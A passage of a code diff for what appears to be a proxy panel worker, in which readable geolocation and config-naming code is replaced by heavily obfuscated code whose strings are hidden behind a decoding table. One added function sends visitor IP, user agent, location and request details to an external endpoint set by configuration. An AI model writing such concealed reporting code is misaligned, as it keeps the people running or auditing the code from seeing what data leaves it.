+        let var_np = var_no[func_dec(206)][func_dec(155)](new RegExp(func_dec(426), func_dec(3)), func_dec(3))[func_dec(18)](func_dec(211))[0][func_dec(18)](func_dec(427))[func_dec(387)]()[func_dec(18)](func_dec(428))[0][func_dec(154)]();
+        return var_np === var_nm;
+      });
+      if (!var_nn) {
+        var_ng[func_dec(72)][func_dec(429)]({
+          [func_dec(206)]: var_nl,
+          [func_dec(402)]: var_nj
         });
-        try {
-            const res = await fetchT(
-                "http://ip-api.com/batch?fields=status,country,countryCode,city,isp,org",
-                {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(queries),
-                },
-            );
-            const results = await res.json();
-            batch.forEach((ip, idx) => {
-                let data = results[idx];
-                if (data && data.status === "success") {
-                    const codePoints = data.countryCode
-                        .toUpperCase()
-                        .split("")
-                        .map((char) => 127397 + char.charCodeAt());
-                    ipGeoCache.set(ip, {
-                        flag: String.fromCodePoint(...codePoints),
-                        country: data.country || "Unknown",
-                        countryCode: data.countryCode || "",
-                        city: data.city || "",
-                        isp: data.isp || data.org || "",
-                    });
-                } else {
-                    ipGeoCache.set(ip, {
-                        flag: "🌐",
-                        country: "Unknown",
-                        countryCode: "",
-                        city: "",
-                        isp: "",
-                    });
-                }
-            });
-        } catch (e) {
-            batch.forEach((ip) => {
-                if (!ipGeoCache.has(ip)) {
-                    ipGeoCache.set(ip, {
-                        flag: "🌐",
-                        country: "Unknown",
-                        countryCode: "",
-                        city: "",
-                        isp: "",
-                    });
-                }
-            });
-        }
+        var_nh = true;
+      }
+    });
+    var_ng[func_dec(36)] = func_dec(3);
+    var_nh = true;
+  }
+  return var_nh;
+}
+async function func_ai(var_nq, var_nr = null) {
+  const var_ns = Date[func_dec(170)]();
+  if (var_nq[func_dec(126)]) {
+    if (var_ns - var_y > var_v) {
+      if (!var_ad) {
+        var_ad = func_r(var_nq, func_dec(138))[func_dec(430)](var_nt => {
+          var_d = {
+            ...var_c,
+            ...(var_nt ? JSON[func_dec(388)](var_nt) : null)
+          };
+          var_y = Date[func_dec(170)]();
+          if (func_ah(var_d)) {
+            const var_nu = func_t(var_nq, func_dec(138), JSON[func_dec(119)](var_d));
+            if (var_nr && typeof var_nr[func_dec(186)] === func_dec(94)) {
+              var_nr[func_dec(186)](var_nu[func_dec(187)](() => {}));
+            } else {
+              var_nu[func_dec(187)](() => {});
+            }
+          }
+        })[func_dec(187)](() => {
+          var_d = {
+            ...var_c
+          };
+          var_y = Date[func_dec(170)]();
+        })[func_dec(91)](() => {
+          var_ad = null;
+        });
+      }
+      await var_ad;
     }
+    if (var_ns - var_z > var_w) {
+      if (!var_ae) {
+        var_ae = func_r(var_nq, func_dec(139))[func_dec(430)](var_nv => {
+          if (var_nv) var_t = JSON[func_dec(388)](var_nv);else var_t = {
+            [func_dec(67)]: {}
+          };
+          var_z = Date[func_dec(170)]();
+        })[func_dec(187)](() => {
+          var_t = {
+            [func_dec(67)]: {}
+          };
+          var_z = Date[func_dec(170)]();
+        })[func_dec(91)](() => {
+          var_ae = null;
+        });
+      }
+      await var_ae;
+    }
+  }
+  if (var_ns - var_ab > var_x) {
+    if (!var_af) {
+      var_af = (var_nq[func_dec(126)] ? func_r(var_nq, func_dec(140)) : Promise[func_dec(431)](null))[func_dec(430)](var_nw => {
+        var_aa = var_nw;
+        var_ab = Date[func_dec(170)]();
+      })[func_dec(187)](() => {
+        var_ab = Date[func_dec(170)]();
+      })[func_dec(91)](() => {
+        var_af = null;
+      });
+    }
+    await var_af;
+  }
+  var_d[func_dec(30)] = var_aa ?? var_nq[func_dec(432)] ?? func_dec(3);
 }
-
-function getEmojiFlag(ip) {
-    if (!ip) return "🌐";
-    let clean = ip
-        .split(":")[0]
-        .replace(/[\[\]]/g, "")
-        .split("#")[0]
-        .trim();
-    let geo = ipGeoCache.get(ip) || ipGeoCache.get(clean);
-    return geo ? geo.flag : "🌐";
-}
-
-function getGeoInfo(ip) {
-    if (!ip)
-        return {
-            flag: "🌐",
-            country: "Unknown",
-            countryCode: "",
-            city: "",
-            isp: "",
-        };
-    let clean = ip
-        .split(":")[0]
-        .replace(/[\[\]]/g, "")
-        .split("#")[0]
-        .trim();
-    return (
-        ipGeoCache.get(ip) ||
-        ipGeoCache.get(clean) || {
-            flag: "🌐",
-            country: "Unknown",
-            countryCode: "",
-            city: "",
-            isp: "",
-        }
-    );
-}
-
-async function fetchIpGeoData(ip) {
-    if (!ip) return null;
-    let clean = ip
-        .split(":")[0]
-        .replace(/[\[\]]/g, "")
-        .split("#")[0]
-        .trim();
-    try {
-        const res = await fetchT(
-            `http://ip-api.com/json/${clean}?fields=status,country,countryCode,city,isp,org`,
-        );
-        const data = await res.json();
-        if (data && data.status === "success") {
-            const codePoints = data.countryCode
-                .toUpperCase()
-                .split("")
-                .map((char) => 127397 + char.charCodeAt());
-            return {
-                flag: String.fromCodePoint(...codePoints),
-                country: data.country || "Unknown",
-                countryCode: data.countryCode || "",
-                city: data.city || "",
-                isp: data.isp || data.org || "",
-            };
-        }
-    } catch (e) {}
+async function func_aj(var_nx, var_ny) {
+  if (!var_nx || !var_ny) return null;
+  try {
+    const var_nz = new Date();
+    const var_oa = var_nz[func_dec(19)]()[func_dec(18)](func_dec(20))[0] + func_dec(433);
+    const var_ob = func_dec(434);
+    const var_oc = {
+      [func_dec(435)]: var_nx,
+      [func_dec(436)]: var_oa
+    };
+    const var_od = await func_e(func_dec(437), {
+      [func_dec(123)]: func_dec(197),
+      [func_dec(104)]: {
+        [func_dec(105)]: func_dec(106) + var_ny + func_dec(3),
+        [func_dec(198)]: func_dec(121)
+      },
+      [func_dec(125)]: JSON[func_dec(119)]({
+        [func_dec(438)]: var_ob,
+        [func_dec(439)]: var_oc
+      })
+    });
+    const var_oe = await var_od[func_dec(107)]();
+    const var_of = var_oe?.[func_dec(212)]?.[func_dec(444)]?.[func_dec(443)]?.[0]?.[func_dec(442)]?.[0]?.[func_dec(441)]?.[func_dec(440)];
+    return typeof var_of === func_dec(15) ? var_of : null;
+  } catch (var_og) {
     return null;
+  }
 }
-
-async function resolveUserProxyIpGeo(user) {
-    if (!user.proxyIp) {
-        user.proxyIpGeo = null;
-        return;
+async function func_ak(var_oh, var_oi, var_oj) {
+  if (!var_d[func_dec(51)] || !(var_d[func_dec(53)] || var_d[func_dec(52)])) return;
+  const func_ee = var_pf => String(var_pf)[func_dec(155)](new RegExp(func_dec(445), func_dec(157)), func_dec(446));
+  let var_ok = func_dec(447);
+  if (var_d[func_dec(54)] && var_d[func_dec(55)]) {
+    const var_pg = await func_aj(var_d[func_dec(54)], var_d[func_dec(55)]);
+    if (var_pg !== null) {
+      const var_ph = 100000;
+      const var_pi = (var_pg / var_ph * 100)[func_dec(180)](2);
+      var_ok = func_dec(3) + var_pg + func_dec(211) + var_ph + func_dec(448) + var_pi + func_dec(449);
     }
-    let pips = getProxyIpsArray(user.proxyIp);
-    if (pips.length === 0) {
-        user.proxyIpGeo = null;
-        return;
+  }
+  const var_ol = var_oh[func_dec(104)][func_dec(150)](func_dec(165)) || func_dec(166);
+  const var_om = var_oh[func_dec(450)] || {};
+  const var_on = var_om[func_dec(451)] || func_dec(166);
+  const var_oo = var_om[func_dec(452)] || func_dec(166);
+  const var_op = var_om[func_dec(453)] || func_dec(166);
+  const var_oq = var_om[func_dec(454)] || func_dec(166);
+  const var_or = var_oh[func_dec(104)][func_dec(150)](func_dec(257)) || new URL(var_oh[func_dec(206)])[func_dec(243)];
+  const var_os = new URL(var_oh[func_dec(206)])[func_dec(209)];
+  const var_ot = var_oh[func_dec(104)][func_dec(150)](func_dec(254)) || func_dec(455);
+  const var_ou = new Date();
+  const var_ov = new Intl[func_dec(456)](func_dec(457), {
+    [func_dec(458)]: func_dec(459),
+    [func_dec(460)]: func_dec(461),
+    [func_dec(462)]: func_dec(459),
+    [func_dec(463)]: func_dec(464),
+    [func_dec(465)]: func_dec(464),
+    [func_dec(466)]: func_dec(464)
+  })[func_dec(306)](var_ou);
+  const var_ow = func_dec(467) + func_ee(var_oi) + func_dec(468) + (func_dec(469) + func_ee(var_ol) + func_dec(468)) + (func_dec(470) + func_ee(var_on) + func_dec(448) + func_ee(var_oo) + func_dec(468)) + (func_dec(471) + func_ee(var_op) + func_dec(448) + func_ee(var_oq) + func_dec(468)) + (func_dec(472) + func_ee(var_or) + func_dec(468)) + (func_dec(473) + func_ee(var_os) + func_dec(468)) + (func_dec(474) + func_ee(var_ot) + func_dec(468)) + (func_dec(475) + func_ee(var_ov) + func_dec(468)) + (func_dec(476) + var_ok + func_dec(3));
+  const var_ox = var_oj || var_or;
+  const var_oy = var_d[func_dec(65)] || func_dec(66);
+  const func_ef = var_pj => var_ag[var_oy]?.[var_pj] || var_ag[func_dec(477)]?.[var_pj] || var_pj;
+  const var_oz = var_d[func_dec(57)] || false;
+  const var_pa = func_dec(301) + var_ox + func_dec(211) + encodeURI(var_d[func_dec(25)]) + func_dec(214);
+  const var_pb = func_dec(301) + var_ox + func_dec(211) + var_d[func_dec(25)] + func_dec(3);
+  const var_pc = [[{
+    [func_dec(200)]: func_dec(478) + func_ef(func_dec(479)) + func_dec(3),
+    [func_dec(480)]: func_dec(481)
+  }, {
+    [func_dec(200)]: func_dec(482) + func_ef(func_dec(483)) + func_dec(3),
+    [func_dec(480)]: func_dec(484)
+  }], [{
+    [func_dec(200)]: func_dec(485) + func_ef(func_dec(486)) + func_dec(3),
+    [func_dec(480)]: func_dec(487)
+  }, {
+    [func_dec(200)]: func_dec(488) + func_ef(func_dec(489)) + func_dec(3),
+    [func_dec(480)]: func_dec(490)
+  }], [{
+    [func_dec(200)]: func_dec(491) + (var_oy === func_dec(66) ? func_dec(492) : func_dec(493)) + func_dec(3),
+    [func_dec(480)]: func_dec(494)
+  }, {
+    [func_dec(200)]: var_oz ? func_dec(495) + func_ef(func_dec(496)) + func_dec(3) : func_dec(497) + func_ef(func_dec(498)) + func_dec(3),
+    [func_dec(480)]: func_dec(499)
+  }], [{
+    [func_dec(200)]: func_dec(500) + func_ef(func_dec(213)) + func_dec(3),
+    [func_dec(501)]: {
+      [func_dec(206)]: var_pa
     }
-    let geoData = await fetchIpGeoData(pips[0]);
-    user.proxyIpGeo = geoData || {
-        flag: "🌐",
-        country: "Unknown",
-        countryCode: "",
-        city: "",
-        isp: "",
-    };
+  }]];
+  const var_pd = func_dec(195) + var_d[func_dec(51)] + func_dec(196);
+  const var_pe = var_d[func_dec(53)] || var_d[func_dec(52)];
+  try {
+    await func_e(var_pd, {
+      [func_dec(123)]: func_dec(197),
+      [func_dec(104)]: {
+        [func_dec(198)]: func_dec(121)
+      },
+      [func_dec(125)]: JSON[func_dec(119)]({
+        [func_dec(199)]: var_pe,
+        [func_dec(200)]: var_ow,
+        [func_dec(201)]: func_dec(502),
+        [func_dec(503)]: ({
+          [func_dec(504)]: var_pc
+        })
+      })
+    });
+  } catch (var_pk) {}
 }
-
-function getConfigName(
-    type,
-    profileName,
-    port,
-    hostName,
-    ip,
-    proxyIp = null,
-    configIndex = 0,
-    ipName = "",
-    isDirect = false
-) {
-    let prefix = sysConfig.namePrefix || "Core";
-    let strategy = sysConfig.nameStrategy || "default";
-    let cleanName = profileName === "Default" ? "" : `-${profileName}`;
-    let typeLab = type === "alpha" ? "V" : "T";
-
-    if (strategy.includes("{") && strategy.includes("}")) {
-        let lookupIp = proxyIp || ip;
-        let geoInfo = getGeoInfo(lookupIp);
-        let protoLab = type === "alpha" ? "VLESS" : "Trojan";
-        let now = new Date();
-        let dateStr =
-            now.getFullYear() +
-            "-" +
-            String(now.getMonth() + 1).padStart(2, "0") +
-            "-" +
-            String(now.getDate()).padStart(2, "0");
-        let workerName =
-            sysConfig.cfWorkerName || sysConfig.name || hostName || "";
-        let flagToUse = isDirect ? "☁️" : geoInfo.flag;
-        let resName = strategy
-            .replace(/{FLAG}/g, flagToUse)
-            .replace(/{COUNTRY}/g, geoInfo.country)
-            .replace(/{CITY}/g, geoInfo.city)
-            .replace(/{ISP}/g, geoInfo.isp)
-            .replace(/{PROTOCOL}/g, protoLab)
-            .replace(/{USER}/g, profileName)
-            .replace(/{PORT}/g, port)
-            .replace(/{PREFIX}/g, prefix)
-            .replace(/{IP}/g, ip || "")
-            .replace(/{IP_NAME}/g, ipName || "")
-            .replace(/{HOST}/g, hostName || "")
-            .replace(/{DATE}/g, dateStr)
-            .replace(/{INDEX}/g, String(configIndex))
-            .replace(/{WORKER}/g, workerName);
-        return resName;
-    }
-
-    if (strategy === "type-user-port") {
-        return `${type === "alpha" ? "vl" + "ess" : "tro" + "jan"}-${profileName}-${port}`;
-    } else if (strategy === "user-port") {
-        return `${profileName}-${port}`;
-    } else if (strategy === "host-port-user") {
-        return `${hostName}-${port}${cleanName}`;
-    } else if (strategy === "prefix-user-port") {
-        return `${prefix}${cleanName}-${port}`;
-    } else if (strategy === "ip") {
-        return ip || "unknown";
-    } else {
-        // "default"
-        return `Evil-${port}${cleanName}`;
-    }
+async function func_al(var_pl, var_pm, var_pn) {
+  if (!var_pl || !var_pl[func_dec(126)]) return;
+  try {
+    const var_po = new Date()[func_dec(19)]();
+    let var_pp = [];
+    const var_pq = await func_r(var_pl, func_dec(505));
+    if (var_pq) var_pp = JSON[func_dec(388)](var_pq);
+    var_pp[func_dec(506)]({
+      [func_dec(507)]: var_po,
+      [func_dec(120)]: var_pm,
+      [func_dec(508)]: var_pn
+    });
+    if (var_pp[func_dec(135)] > 50) var_pp = var_pp[func_dec(145)](0, 50);
+    await func_s(var_pl, func_dec(505), JSON[func_dec(119)](var_pp));
+  } catch (var_pr) {}
 }
-
-function calcEffectiveIps(ips, maxCfg, effectiveMode, effectivePorts, pipsCount = 1) {
-    if (!maxCfg) return ips;
-    let protoCount = effectiveMode === "both" ? 2 : 1;
-    let portCount = effectivePorts.length;
-    let directMultiplier = sysConfig.enableDirectConfigs ? 2 : 1;
-    let multiplier = protoCount * portCount * directMultiplier * Math.max(1, pipsCount);
-    let neededIps = Math.max(1, Math.floor(maxCfg / multiplier));
-    return ips.slice(0, neededIps);
-}
-
-function getProfileHostNames(hostName, profile) {
-    let primaryHost =
-        profile && profile.userPanelUrl ? profile.userPanelUrl : hostName;
-    let names = [];
-    if (profile && profile.userNodes && profile.userNodes.trim()) {
-        names.push(
-            ...profile.userNodes
-                .split(/[\r\n,;]+/)
-                .map((s) => linkedPanelHost(s.trim()))
-                .filter(Boolean),
-        );
-    } else {
-        names.push(linkedPanelHost(primaryHost));
-        names.push(...getGlobalNodeHosts());
+async function func_am(var_ps, var_pt) {
+  try {
+    if (var_ps[func_dec(123)] === func_dec(197)) {
+      const var_pu = await var_ps[func_dec(107)]();
+      if (!func_ad(var_ps, var_pu)) return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: false
+      }), {
+        [func_dec(231)]: 401
+      });
+      let var_pv = [];
+      if (var_pt[func_dec(126)]) {
+        const var_pw = await func_r(var_pt, func_dec(505));
+        if (var_pw) var_pv = JSON[func_dec(388)](var_pw);
+      }
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: true,
+        [func_dec(222)]: var_pv
+      }), {
+        [func_dec(231)]: 200
+      });
     }
-    return [...new Set(names)];
+    return new Response(func_dec(509), {
+      [func_dec(231)]: 200
+    });
+  } catch (var_px) {
+    return new Response(JSON[func_dec(119)]({
+      [func_dec(108)]: false
+    }), {
+      [func_dec(231)]: 400
+    });
+  }
 }
-
-function getEffectiveNat64(userNat64) {
-    let parts = [];
-    if (userNat64)
-        parts.push(
-            ...userNat64
-                .split(/[\r\n,;]+/)
-                .map((s) => s.trim())
-                .filter(Boolean),
-        );
-    if (sysConfig.nat64Prefix)
-        parts.push(
-            ...sysConfig.nat64Prefix
-                .split(/[\r\n,;]+/)
-                .map((s) => s.trim())
-                .filter(Boolean),
-        );
-    return [...new Set(parts)].join(",") || null;
-}
-
-function getEffectivePips(p) {
-    let effectiveNat64 = getEffectiveNat64(p.nat64);
-    let pips = getProxyIpsWithNat64(p.proxyIp, effectiveNat64);
-    if (pips.length === 0 && sysConfig.backupRelay) {
-        pips = getProxyIpsWithNat64(sysConfig.backupRelay, effectiveNat64);
+async function func_an(var_py, var_pz, var_qa) {
+  try {
+    const var_qb = new URL(var_py[func_dec(206)]);
+    const var_qc = var_py[func_dec(123)];
+    const var_qd = var_qb[func_dec(258)][func_dec(150)](func_dec(172));
+    const var_qe = var_qb[func_dec(258)][func_dec(150)](func_dec(404));
+    const var_qf = var_py[func_dec(104)][func_dec(150)](func_dec(105)) || func_dec(3);
+    const var_qg = var_qf[func_dec(155)](func_dec(106), func_dec(3)) || var_qb[func_dec(258)][func_dec(150)](func_dec(163)) || func_dec(3);
+    let var_qh = func_dec(3);
+    if (var_qc === func_dec(197) || var_qc === func_dec(124)) {
+      try {
+        const var_qk = await var_py[func_dec(510)]()[func_dec(107)]();
+        var_qh = var_qk[func_dec(163)] || func_dec(3);
+      } catch (var_ql) {}
     }
-    if (pips.length === 0 && sysConfig.customRelay) {
-        pips = getProxyIpsWithNat64(sysConfig.customRelay, effectiveNat64);
-    }
-    return pips;
-}
-
-// ─── Per-user segmentation (anti-filter fragment) + TLS mask ──────────────
-// Storage (users[] object): segMode "off"|"builder"|"manual",
-// builder fields segPackets/segLengths/segDelays/segMaxSplit,
-// manual field segManual (classic "a-b,c-d,packets" OR finalmask JSON),
-// TLS mask field tlsMask (colon-separated TLS_* cipher list).
-// All helpers are fail-open: invalid input yields null (link built plain).
-function parseSegRangeList(s, maxItems) {
-    try {
-        const items = String(s || "")
-            .split(",")
-            .map((x) => x.trim())
-            .filter(Boolean)
-            .slice(0, maxItems);
-        if (!items.length) return null;
-        for (const it of items) {
-            if (!/^\d{1,5}(-\d{1,5})?$/.test(it)) return null;
+    const var_qi = var_qg === var_d[func_dec(31)] || var_qh === var_d[func_dec(31)] || func_ab(var_qg) || func_ab(var_qh);
+    const var_qj = var_py[func_dec(104)][func_dec(150)](func_dec(165)) || func_dec(166);
+    if (func_ck(var_qj)) {
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: false,
+        [func_dec(511)]: func_dec(512)
+      }), {
+        [func_dec(231)]: 429,
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
         }
-        return items;
-    } catch (e) {
-        return null;
+      });
     }
+    if (!var_qi) {
+      func_cl(var_qj);
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: false,
+        [func_dec(511)]: func_dec(513)
+      }), {
+        [func_dec(231)]: 401,
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
+        }
+      });
+    }
+    if (var_qc === func_dec(253) && !var_qd) {
+      const var_qm = var_qb[func_dec(258)][func_dec(150)](func_dec(514)) || func_dec(3);
+      let var_qn = var_d[func_dec(67)] || [];
+      if (var_qm) {
+        const var_qp = var_qm[func_dec(154)]();
+        var_qn = var_qn[func_dec(412)](var_qq => var_qq[func_dec(24)][func_dec(154)]()[func_dec(256)](var_qp) || var_qq[func_dec(172)][func_dec(154)]()[func_dec(256)](var_qp) || var_qq[func_dec(515)] && var_qq[func_dec(515)][func_dec(154)]()[func_dec(256)](var_qp));
+      }
+      const var_qo = var_qn[func_dec(144)](var_qr => {
+        const var_qs = var_qr[func_dec(172)][func_dec(155)](new RegExp(func_dec(156), func_dec(157)), func_dec(3))[func_dec(154)]();
+        const var_qt = var_t?.[func_dec(67)]?.[var_qs] || {
+          [func_dec(17)]: 0,
+          [func_dec(23)]: 0,
+          [func_dec(21)]: func_dec(3)
+        };
+        const var_qu = func_f(var_qt);
+        const var_qv = func_h(var_qr[func_dec(70)]);
+        const var_qw = var_qr[func_dec(71)] && Date[func_dec(170)]() > var_qr[func_dec(71)];
+        let var_qx = func_dec(292);
+        if (var_qr[func_dec(57)] && var_qr[func_dec(184)]) var_qx = func_dec(516);else if (var_qr[func_dec(57)]) var_qx = func_dec(293);else if (var_qw) var_qx = func_dec(294);
+        return {
+          ...var_qr,
+          [func_dec(517)]: {
+            [func_dec(518)]: var_qu,
+            [func_dec(295)]: var_qv,
+            [func_dec(519)]: var_qt[func_dec(23)] || 0,
+            [func_dec(296)]: var_qr[func_dec(288)] || 0
+          },
+          [func_dec(231)]: var_qx
+        };
+      });
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: true,
+        [func_dec(67)]: var_qo,
+        [func_dec(518)]: var_qo[func_dec(135)]
+      }), {
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
+        }
+      });
+    }
+    if (var_qc === func_dec(253) && var_qd) {
+      const var_qy = (var_d[func_dec(67)] || [])[func_dec(260)](var_rh => var_rh[func_dec(172)] === var_qd || var_rh[func_dec(24)][func_dec(154)]() === var_qd[func_dec(154)]());
+      if (!var_qy) return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: false,
+        [func_dec(511)]: func_dec(520)
+      }), {
+        [func_dec(231)]: 404,
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
+        }
+      });
+      const var_qz = var_qy[func_dec(172)][func_dec(155)](new RegExp(func_dec(156), func_dec(157)), func_dec(3))[func_dec(154)]();
+      const var_ra = var_t?.[func_dec(67)]?.[var_qz] || {
+        [func_dec(17)]: 0,
+        [func_dec(23)]: 0,
+        [func_dec(21)]: func_dec(3)
+      };
+      const var_rb = func_f(var_ra);
+      const var_rc = func_h(var_qy[func_dec(70)]);
+      const var_rd = var_qy[func_dec(71)] && Date[func_dec(170)]() > var_qy[func_dec(71)];
+      let var_re = func_dec(292);
+      if (var_qy[func_dec(57)] && var_qy[func_dec(184)]) var_re = func_dec(516);else if (var_qy[func_dec(57)]) var_re = func_dec(293);else if (var_rd) var_re = func_dec(294);
+      const var_rf = new URL(var_py[func_dec(206)])[func_dec(243)];
+      const var_rg = func_dec(301) + var_rf + func_dec(211) + var_d[func_dec(25)] + func_dec(521) + encodeURIComponent(var_qy[func_dec(24)]) + func_dec(3);
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: true,
+        [func_dec(522)]: {
+          ...var_qy,
+          [func_dec(517)]: {
+            [func_dec(518)]: var_rb,
+            [func_dec(295)]: var_rc,
+            [func_dec(519)]: var_ra[func_dec(23)] || 0,
+            [func_dec(296)]: var_qy[func_dec(288)] || 0
+          },
+          [func_dec(231)]: var_re,
+          [func_dec(523)]: var_rg
+        }
+      }), {
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
+        }
+      });
+    }
+    if (var_qc === func_dec(197) && !var_qd) {
+      const var_ri = await var_py[func_dec(107)]();
+      const {
+        [func_dec(24)]: var_rj,
+        [func_dec(524)]: var_rk,
+        [func_dec(525)]: var_rl,
+        [func_dec(515)]: var_rm,
+        [func_dec(526)]: var_rn,
+        [func_dec(527)]: var_ro,
+        [func_dec(528)]: var_rp,
+        [func_dec(529)]: var_rq,
+        [func_dec(530)]: var_rr,
+        [func_dec(531)]: var_rs,
+        [func_dec(532)]: var_rt,
+        [func_dec(533)]: var_ru,
+        [func_dec(298)]: var_rv,
+        [func_dec(534)]: var_rw,
+        [func_dec(535)]: var_rx,
+        [func_dec(536)]: var_ry,
+        [func_dec(537)]: var_rz,
+        [func_dec(538)]: var_sa,
+        [func_dec(539)]: var_sb,
+        [func_dec(540)]: var_sc
+      } = var_ri;
+      if (!var_rj) return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: false,
+        [func_dec(511)]: func_dec(541)
+      }), {
+        [func_dec(231)]: 400,
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
+        }
+      });
+      const var_sd = crypto[func_dec(167)]();
+      const var_se = {
+        [func_dec(172)]: var_sd,
+        [func_dec(24)]: var_rj,
+        [func_dec(70)]: var_rk ? Math[func_dec(16)](parseFloat(var_rk) * 6000) : null,
+        [func_dec(288)]: var_ri[func_dec(296)] ? Math[func_dec(16)](parseFloat(var_ri[func_dec(296)]) * 6000) : null,
+        [func_dec(71)]: var_rl ? Date[func_dec(170)]() + parseInt(var_rl) * 86400000 : null,
+        [func_dec(515)]: var_rm || func_dec(3),
+        [func_dec(526)]: var_rn ? parseInt(var_rn) : null,
+        [func_dec(527)]: var_ro || null,
+        [func_dec(528)]: var_rp || null,
+        [func_dec(529)]: var_rq || null,
+        [func_dec(530)]: var_rr || null,
+        [func_dec(531)]: var_rs || null,
+        [func_dec(532)]: var_rt || null,
+        [func_dec(533)]: var_ru ? parseInt(var_ru) : null,
+        [func_dec(298)]: var_rv || null,
+        [func_dec(534)]: var_rw === func_dec(542) || var_rw === func_dec(543) ? var_rw : null,
+        [func_dec(535)]: var_rx ? String(var_rx)[func_dec(145)](0, 32) : null,
+        [func_dec(536)]: var_ry ? String(var_ry)[func_dec(145)](0, 200) : null,
+        [func_dec(537)]: var_rz ? String(var_rz)[func_dec(145)](0, 200) : null,
+        [func_dec(538)]: var_sa ? String(var_sa)[func_dec(145)](0, 12) : null,
+        [func_dec(539)]: var_sb ? String(var_sb)[func_dec(145)](0, 4000) : null,
+        [func_dec(540)]: var_sc ? String(var_sc)[func_dec(145)](0, 2000) : null,
+        [func_dec(174)]: Date[func_dec(170)]()
+      };
+      await func_dg(var_se);
+      if (!var_d[func_dec(67)]) var_d[func_dec(67)] = [];
+      var_d[func_dec(67)][func_dec(429)](var_se);
+      await func_t(var_pz, func_dec(138), JSON[func_dec(119)](var_d));
+      var_qa?.[func_dec(186)](func_al(var_pz, func_dec(544), func_dec(189) + var_rj + func_dec(190) + var_sd + func_dec(545))[func_dec(187)](() => {}));
+      const var_sf = new URL(var_py[func_dec(206)])[func_dec(243)];
+      const var_sg = func_dec(301) + var_sf + func_dec(211) + var_d[func_dec(25)] + func_dec(521) + encodeURIComponent(var_rj) + func_dec(3);
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: true,
+        [func_dec(522)]: var_se,
+        [func_dec(523)]: var_sg
+      }), {
+        [func_dec(231)]: 201,
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
+        }
+      });
+    }
+    if (var_qc === func_dec(124) && var_qd) {
+      const var_sh = await var_py[func_dec(107)]();
+      if (!var_d[func_dec(67)]) return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: false,
+        [func_dec(511)]: func_dec(546)
+      }), {
+        [func_dec(231)]: 400,
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
+        }
+      });
+      const var_si = var_d[func_dec(67)][func_dec(260)](var_sk => var_sk[func_dec(172)] === var_qd);
+      if (!var_si) return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: false,
+        [func_dec(511)]: func_dec(520)
+      }), {
+        [func_dec(231)]: 404,
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
+        }
+      });
+      const var_sj = var_si[func_dec(24)];
+      if (var_sh[func_dec(24)] !== undefined) var_si[func_dec(24)] = var_sh[func_dec(24)];
+      if (var_sh[func_dec(524)] !== undefined) var_si[func_dec(70)] = var_sh[func_dec(524)] ? Math[func_dec(16)](parseFloat(var_sh[func_dec(524)]) * 6000) : null;
+      if (var_sh[func_dec(296)] !== undefined) var_si[func_dec(288)] = var_sh[func_dec(296)] ? Math[func_dec(16)](parseFloat(var_sh[func_dec(296)]) * 6000) : null;
+      if (var_sh[func_dec(525)] !== undefined) var_si[func_dec(71)] = var_sh[func_dec(525)] ? Date[func_dec(170)]() + parseInt(var_sh[func_dec(525)]) * 86400000 : null;
+      if (var_sh[func_dec(515)] !== undefined) var_si[func_dec(515)] = var_sh[func_dec(515)];
+      if (var_sh[func_dec(526)] !== undefined) var_si[func_dec(526)] = var_sh[func_dec(526)] ? parseInt(var_sh[func_dec(526)]) : null;
+      if (var_sh[func_dec(527)] !== undefined) {
+        var_si[func_dec(527)] = var_sh[func_dec(527)];
+        if (!var_sh[func_dec(527)]) {
+          var_si[func_dec(547)] = null;
+        } else {
+          await func_dg(var_si);
+        }
+      }
+      if (var_sh[func_dec(528)] !== undefined) var_si[func_dec(528)] = var_sh[func_dec(528)];
+      if (var_sh[func_dec(529)] !== undefined) var_si[func_dec(529)] = var_sh[func_dec(529)];
+      if (var_sh[func_dec(530)] !== undefined) var_si[func_dec(530)] = var_sh[func_dec(530)];
+      if (var_sh[func_dec(531)] !== undefined) var_si[func_dec(531)] = var_sh[func_dec(531)];
+      if (var_sh[func_dec(532)] !== undefined) var_si[func_dec(532)] = var_sh[func_dec(532)];
+      if (var_sh[func_dec(533)] !== undefined) var_si[func_dec(533)] = var_sh[func_dec(533)] ? parseInt(var_sh[func_dec(533)]) : null;
+      if (var_sh[func_dec(298)] !== undefined) var_si[func_dec(298)] = var_sh[func_dec(298)] || null;
+      if (var_sh[func_dec(534)] !== undefined) var_si[func_dec(534)] = var_sh[func_dec(534)] === func_dec(542) || var_sh[func_dec(534)] === func_dec(543) ? var_sh[func_dec(534)] : null;
+      if (var_sh[func_dec(535)] !== undefined) var_si[func_dec(535)] = var_sh[func_dec(535)] ? String(var_sh[func_dec(535)])[func_dec(145)](0, 32) : null;
+      if (var_sh[func_dec(536)] !== undefined) var_si[func_dec(536)] = var_sh[func_dec(536)] ? String(var_sh[func_dec(536)])[func_dec(145)](0, 200) : null;
+      if (var_sh[func_dec(537)] !== undefined) var_si[func_dec(537)] = var_sh[func_dec(537)] ? String(var_sh[func_dec(537)])[func_dec(145)](0, 200) : null;
+      if (var_sh[func_dec(538)] !== undefined) var_si[func_dec(538)] = var_sh[func_dec(538)] ? String(var_sh[func_dec(538)])[func_dec(145)](0, 12) : null;
+      if (var_sh[func_dec(539)] !== undefined) var_si[func_dec(539)] = var_sh[func_dec(539)] ? String(var_sh[func_dec(539)])[func_dec(145)](0, 4000) : null;
